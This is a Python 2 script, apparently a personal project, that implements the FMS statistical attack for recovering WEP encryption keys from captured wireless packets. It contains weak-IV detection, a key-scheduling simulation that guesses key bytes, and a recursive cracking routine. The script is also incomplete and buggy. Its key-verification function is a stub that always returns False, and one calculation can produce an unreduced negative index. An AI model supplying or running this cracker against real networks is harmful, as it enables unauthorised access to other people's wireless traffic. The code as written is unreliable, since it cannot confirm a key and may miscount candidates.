#!/usr/bin/env python

__author__ = 'shane'

# N id the size of the seed array for KSA
N = 256


def simulate_resolved(b, iv, byte, wep_key):
    """

    :param b: index of the byte in the secret key we want to simulate
    :param iv: IV of the packet we're using
    :param byte: First encrypted byte of the WEP packet
    :param wep_key: secret key
    :return: the simulated value of wep_key[b]
    """
    k = iv + wep_key
    # Perform b + 3 iterations of KSA
    s = [i for i in range(N)]
    j = 0
    for i in range(b + 3):
        j = (j + s[i] + k[i % len(k)]) % N
        # Swap(s[i], s[j])
        temp = s[i]
        s[i] = s[j]
        s[j] = temp
    # Reverse the PRGA/KSA to find the probable value of wep_key[b]
    # 0xAA SNAP Header should be first plaintext byte of WEP packets
    z = byte ^ 0xAA
    return s.index(z) - j - s[b + 3]
    # Will key_byte ever be negative?


def weak_iv(iv, wep_key_len):
    """
    H1kari's method of weak IV detection from:
    http://www.dartmouth.edu/~madory/RC4/wepexp.txt

    :param iv: the iv in question
    :param wep_key_len: the length of the wep key (5 or 13)
    :return: the key index that the iv is weak against or -1
    """
    x = iv[0]
    y = iv[1]
    z = iv[2]
    a = (x + y) % N
    b = (x + y - z) % N
    for B in range(wep_key_len):
        if ((0 <= a < B) or (a == B and b == (B + 1) * 2) and (a != (B + 1) / 2 if B % 2 else 1) or
           (a == B + 1 and (b == (B + 1) * 2 if B == 0 else 1)) or
           (x == B + 3 and y == N - 1) or
           ((x == 1 and y == (B / 2) + 1) or (x == (B / 2) + 2 and y == (N - 1) - x) if (B != 0 and not (B % 2)) else 0)):
            return B
    return -1


# TODO
def check_key(wep_key, full_packets):
    """
    Uses the iv from the packet and the given WEP key to decrypt each packet.
    Then calculate the checksum and compares it to the decrypted one.
    If each checksum matches, we have a winner.

    :param wep_key: a full 5 or 13 byte wep key
    :param full_packets: a list of complete wep packets
    :return: True if the key is correct
    """
    return False


def crack_wep(wep_key_len, full_packets,  short_packets, wep_key, b):
    if wep_key_len == b:
        return check_key(wep_key, full_packets)
    counts = [0] * 256
    for p in short_packets:
        iv = p[0]
        byte = p[1]
        # construct byte counts
        if weak_iv(iv, wep_key_len) == b:
            counts[simulate_resolved(b, iv, byte, wep_key)] += 1
    # Try the top 10 most frequent byte values
    for byte in sorted(range(len(counts)), key=counts.__getitem__, reverse=True)[0:10]:
        wep_key[b] = byte
        if crack_wep(wep_key_len, full_packets, short_packets, wep_key, b + 1):
            return True
    return False


def main(wep_key_len, full_packets,  short_packets):
    wep_key = [0] * wep_key_len

    if crack_wep(wep_key_len, full_packets,  short_packets, wep_key, 0):
        print "Success! WEP key: %s" % wep_key
        return wep_key
    else:
        print "Failed! Try again with more than %d packets." % len(short_packets)
